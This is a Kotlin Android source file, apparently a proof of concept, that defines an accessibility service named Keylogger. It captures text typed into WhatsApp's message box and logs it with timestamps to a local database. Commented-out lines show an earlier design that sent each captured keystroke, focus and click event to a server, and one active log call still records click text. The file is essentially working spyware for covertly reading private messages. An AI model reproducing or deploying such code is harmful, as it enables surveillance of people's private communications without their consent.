package com.synergia.datapoc

import android.accessibilityservice.AccessibilityService
import android.app.ActivityManager
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.text.DateFormat
import java.text.SimpleDateFormat
import java.util.*


/**
 * Created by Brian on 3/10/2017.
 */
class Keylogger : AccessibilityService() {
    var app = ""
    var focused = ""
    var message = ""
    public override fun onServiceConnected() {
        Log.d("Keylogger", "Starting service")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val df: DateFormat =
            SimpleDateFormat("dd/MM/yyyy, HH:mm", Locale.US)
        val time = df.format(Calendar.getInstance().time)
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val data = event.text.toString()
                val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                val foregroundTaskInfo = am.getRunningTasks(1)[0];
                val foregroundTaskPackageName: String =
                    foregroundTaskInfo.topActivity!!.packageName
                val pm: PackageManager = packageManager
                val foregroundAppPackageInfo =
                    pm.getPackageInfo(foregroundTaskPackageName, 0)
                val foregroundTaskAppName = foregroundAppPackageInfo.applicationInfo.loadLabel(pm).toString()
                /* SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(TEXT)|" + data);*/
                //   Log.d("|(TEXT)|", data);
                if (focused.contentEquals("[Type a message]") && app.contentEquals("[WhatsApp]")) {
                    message = data.substring(1, data.length - 1)
                }
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val data = event.text.toString()
                /* SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(FOCUSED)|" + data);*/
                //   Log.d("|(FOCUSED)|", data);
                if (data.contentEquals("[Type a message]")) {
                    focused = "[Type a message]"
                } else {
                    focused = ""
                    message = ""
                }
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val data = event.text.toString()
                /* SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(CLICKED)|" + data);*/Log.d(
                    "|(CLICKED)|",
                    data
                )
                    if (app.isBlank()&&data.contains("WhatsApp", ignoreCase = true)) {
                        app = "[WhatsApp]"
                    }

            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                val data = event.text.toString()
                /* SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(CLICKED)|" + data);*/
                // The first in the list of RunningTasks is always the foreground task.
// The first in the list of RunningTasks is always the foreground task.

                if (focused.contentEquals("[Type a message]") && app.contentEquals("[WhatsApp]")) {
                    if (message.isNotEmpty()) {
                        val sendLog=SendLog(time,message)
                        GlobalScope.launch {AppDatabase.getDatabase(applicationContext)!!.msgDao().insertSendLog(sendLog)  }
                    }
                }
            }
            else -> {
            }
        }
    }

    override fun onInterrupt() {}
}